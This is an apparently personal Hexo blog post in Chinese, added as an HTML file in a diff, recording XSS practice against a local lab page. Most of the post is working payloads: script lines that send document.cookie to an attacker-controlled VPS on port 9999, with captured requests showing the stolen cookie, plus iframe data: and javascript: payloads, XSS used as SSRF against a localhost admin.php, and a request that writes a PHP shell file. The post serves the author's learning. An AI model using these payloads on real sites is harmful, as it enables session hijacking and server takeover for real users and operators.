@@ -1,0 +1,696 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2">
+
+
+
+
+
+
+<meta name="description" content="需要掌握的基础知识点 document.cookie  用户cookie navigator.userAgent  识别用户浏览器 btoa为js中的base64编码，atob为解码 1234btoa(&apos;adsda&apos;)&quot;YWRzZGE=&quot;atob(&quot;YWRzZGE=&quot;)&quot;adsda&quot;  向VPS发送数据no.1 可以获取想要的数据 伪造cookie等等 no.2 如果后台有限制ip为127.0">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss">
+<meta property="og:url" content="http://yoursite.com/2019/09/21/xss/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="需要掌握的基础知识点 document.cookie  用户cookie navigator.userAgent  识别用户浏览器 btoa为js中的base64编码，atob为解码 1234btoa(&apos;adsda&apos;)&quot;YWRzZGE=&quot;atob(&quot;YWRzZGE=&quot;)&quot;adsda&quot;  向VPS发送数据no.1 可以获取想要的数据 伪造cookie等等 no.2 如果后台有限制ip为127.0">
+<meta property="og:locale" content="zh">
+<meta property="og:updated_time" content="2019-09-22T00:16:17.825Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="xss">
+<meta name="twitter:description" content="需要掌握的基础知识点 document.cookie  用户cookie navigator.userAgent  识别用户浏览器 btoa为js中的base64编码，atob为解码 1234btoa(&apos;adsda&apos;)&quot;YWRzZGE=&quot;atob(&quot;YWRzZGE=&quot;)&quot;adsda&quot;  向VPS发送数据no.1 可以获取想要的数据 伪造cookie等等 no.2 如果后台有限制ip为127.0">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/09/21/xss/">
+
+
+
+
+
+  <title>xss | Hexo</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/21/xss/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">xss</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-21T20:52:08+08:00">
+                2019-09-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <a id="more"></a>
+
+<p>需要掌握的基础知识点</p>
+<p>document.cookie  用户cookie</p>
+<p>navigator.userAgent  识别用户浏览器</p>
+<p>btoa为js中的base64编码，atob为解码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">btoa(<span class="string">'adsda'</span>)</span><br><span class="line"><span class="string">"YWRzZGE="</span></span><br><span class="line">atob(<span class="string">"YWRzZGE="</span>)</span><br><span class="line"><span class="string">"adsda"</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="向VPS发送数据"><a href="#向VPS发送数据" class="headerlink" title="向VPS发送数据"></a>向VPS发送数据</h2><p><strong>no.1</strong> 可以获取想要的数据 伪造cookie等等</p>
+<p><strong>no.2</strong> 如果后台有限制ip为127.0.0.1才能访问的文件，可以用xss打一个ssrf  比如这样</p>
+<p>document.createElement(“img”)</p>
+<p>img.src=”<a href="http://127.0.0.1/admin.php?file=shell&amp;date=phpinfo&quot;" target="_blank" rel="noopener">http://127.0.0.1/admin.php?file=shell&amp;date=phpinfo&quot;</a></p>
+<h4 id="创建标签"><a href="#创建标签" class="headerlink" title="创建标签"></a>创建标签</h4><p>document.createElement(“img”) 创建一个img标签</p>
+<p>img.src=”<a href="http://vps_ip:9999/给标签的src属性赋值" target="_blank" rel="noopener">http://vps_ip:9999/给标签的src属性赋值</a></p>
+<p>创建一个标签，然后给这个标签的属性赋值，有两种方式</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var iframe = document.createElement('iframe'); </span><br><span class="line">iframe.src=xss;  </span><br><span class="line">document.body.appendChild(iframe);</span><br><span class="line"></span><br><span class="line">var iframe = document.createElement('iframe');</span><br><span class="line">iframe.setAttribute('src',xss);</span><br><span class="line">document.body.appendChild(iframe);</span><br></pre></td></tr></table></figure>
+
+<h4 id="lt-a-gt-标签"><a href="#lt-a-gt-标签" class="headerlink" title="&lt;a&gt;标签"></a>&lt;a&gt;标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://vps_ip:9999/a?cookie="</span>+<span class="attr">document.cookie</span>&gt;</span>点击抽奖\<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这样可以向外连VPS，但不能把cookie传出去  还没弄明白 。。</p>
+<h4 id="lt-img-gt-标签"><a href="#lt-img-gt-标签" class="headerlink" title="&lt;img&gt;标签"></a>&lt;img&gt;标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">var</span> img=<span class="built_in">document</span>.createElement(<span class="string">"img"</span>);img.src=<span class="string">"http://vps_ip:9999/cookie=?"</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  这个可以把cookie传出来</span><br><span class="line"></span><br><span class="line">结果</span><br><span class="line">GET /cookie=?cookie%5Buser%5D%3Dadmin%3B%20user%3Dadmin HTTP/1.1</span><br><span class="line">Host: 192.168.110.1:9999</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://192.168.110.140/xss/Less-1/index.php?phone=%3Cscript%3Evar+img%3Ddocument.createElement%28%22img%22%29%3Bimg.src%3D%22http%3A%2F%2F192.168.110.1%3A9999%2Fcookie%3D%3F%22%2Bescape%28document.cookie%29%3B%3C%2Fscript%3E&amp;submit=submit</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure>
+
+<h4 id="window-location"><a href="#window-location" class="headerlink" title="window.location"></a>window.location</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.location.href=<span class="string">"http://192.168.110.1:9999?cookie="</span>+<span class="built_in">document</span>.cookie; </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">结果 拿到cookie</span><br><span class="line">GET /?cookie=cookie[user]=admin;%20user=admin HTTP/1.1</span><br><span class="line">Host: 192.168.110.1:9999</span><br></pre></td></tr></table></figure>
+
+<h4 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h4><p>iframe标签有特别多的地方可以利用</p>
+<p>可以使用</p>
+<p>on+++等属性，</p>
+<p>还有src属性 src属性还支持data javascript等协议</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">date协议</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html,&lt;script&gt;alert('xss')&lt;/script&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">这里还可以进行一下base64编码  后面的闭合标签有没有都行</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4="</span>&gt;</span> </span><br><span class="line"></span><br><span class="line">js协议</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line">http协议</span><br><span class="line">我在后台放了一个admin.php 里面写着phpinfo</span><br><span class="line">调用一下试试，这里得让admin来调用，要不然触发的是自己主机上的admin.php</span><br><span class="line">我用虚拟机访问了一下paylaod，来模拟admin</span><br><span class="line">可以触发phpinfo</span><br><span class="line">    </span><br><span class="line">payload1</span><br><span class="line">http://192.168.110.140/xss/Less-1/index.php?phone=<span class="tag">&lt;<span class="name">iframe+src=".</span>/<span class="attr">admin.php</span>"&gt;</span>&amp;submit=submit</span><br><span class="line">    </span><br><span class="line">payload2  写全路径</span><br><span class="line">http://192.168.110.140/xss/Less-1/index.php?phone=<span class="tag">&lt;<span class="name">iframe+src="http:</span>//<span class="attr">127.0.0.1</span>/<span class="attr">xss</span>/<span class="attr">Less-1</span>/<span class="attr">admin.php</span>"&gt;</span>&amp;submit=submit</span><br><span class="line"></span><br><span class="line">还可以去手动创建一个iframe标签，利用document</span><br><span class="line">if=document.createElement("iframe")</span><br><span class="line">if.src=http://127.0.0.1/xss/Less-1/admin.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="写个shell试试"><a href="#写个shell试试" class="headerlink" title="写个shell试试"></a>写个shell试试</h3><h4 id="img标签"><a href="#img标签" class="headerlink" title="img标签"></a>img标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?phone=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">var</span>+img=<span class="built_in">document</span>.createElement(<span class="string">"img"</span>);img.src=<span class="string">"http://192.168.110.140/xss/Less-1/admin.php?file=shell.php%26date=&lt;?php phpinfo()?&gt;"</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问shell.php phpinfo成功执行</p>
+<h4 id="用iframe标签试试"><a href="#用iframe标签试试" class="headerlink" title="用iframe标签试试"></a>用iframe标签试试</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?phone=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">var</span>+iframe=<span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);iframe.src=<span class="string">"http://192.168.110.140/xss/Less-1/admin.php?file=shell.php%26date=&lt;?php phpinfo()?&gt;"</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">这样打不通</span><br><span class="line"></span><br><span class="line">需要把iframe添加到html中去</span><br><span class="line">?phone=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">var</span>+iframe=<span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);iframe.src=<span class="string">"http://192.168.110.140/xss/Less-1/admin.php?file=shell.php%26date=&lt;?php+phpinfo()?&gt;"</span>;<span class="built_in">document</span>.body.appendChild(iframe);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&amp;submit=submit</span><br><span class="line">这样就可以</span><br></pre></td></tr></table></figure>
+
+<p>这里不是很明白为什么Img标签不用添加到html中，而iframe需要添加</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这样也是可以的</span><br><span class="line">?phone=&lt;iframe+src="http://192.168.110.140/xss/Less-1/admin.php?file=shell.php%26date=&lt;?php phpinfo()?&gt;"&gt;&amp;submit=submit</span><br></pre></td></tr></table></figure>
+
+<p>参考连接</p>
+<p><a href="https://v0w.top/2018/08/18/XSS%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5&amp;%E5%9C%A8CTF%E4%B8%AD%E7%9A%84%E8%BF%90%E7%94%A8/#%E5%88%9D%E6%8E%A2XSS-Payload" target="_blank" rel="noopener">https://v0w.top/2018/08/18/XSS%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5&amp;%E5%9C%A8CTF%E4%B8%AD%E7%9A%84%E8%BF%90%E7%94%A8/#%E5%88%9D%E6%8E%A2XSS-Payload</a></p>
+<p><a href="http://www.guimaizi.com/archives/379" target="_blank" rel="noopener">http://www.guimaizi.com/archives/379</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/09/20/hacker101/" rel="next" title="hacker101">
+                <i class="fa fa-chevron-left"></i> hacker101
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="John Doe">
+          <p class="site-author-name" itemprop="name">John Doe</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">17</span>
+                <span class="site-state-item-name">posts</span>
+              </a>
+            </div>
+          
+
+          
+
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#向VPS发送数据"><span class="nav-number">1.</span> <span class="nav-text">向VPS发送数据</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#创建标签"><span class="nav-number">1.0.1.</span> <span class="nav-text">创建标签</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#lt-a-gt-标签"><span class="nav-number">1.0.2.</span> <span class="nav-text">&lt;a&gt;标签</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#lt-img-gt-标签"><span class="nav-number">1.0.3.</span> <span class="nav-text">&lt;img&gt;标签</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#window-location"><span class="nav-number">1.0.4.</span> <span class="nav-text">window.location</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#iframe"><span class="nav-number">1.0.5.</span> <span class="nav-text">iframe</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#写个shell试试"><span class="nav-number">1.1.</span> <span class="nav-text">写个shell试试</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#img标签"><span class="nav-number">1.1.1.</span> <span class="nav-text">img标签</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#用iframe标签试试"><span class="nav-number">1.1.2.</span> <span class="nav-text">用iframe标签试试</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
